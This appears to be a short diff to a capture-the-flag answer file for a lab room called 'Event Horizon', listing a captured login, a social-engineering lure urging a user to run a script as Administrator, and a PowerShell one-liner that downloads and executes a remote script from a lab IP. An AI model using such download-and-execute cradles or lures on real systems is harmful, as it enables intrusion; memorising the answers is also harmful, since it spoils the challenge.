@@ -1,3 +1,5 @@
+# Event Horizon [HARD]
+
 1. 1. tom.dom@eventhorizon.thm:password
    2. Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm
    3. IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')
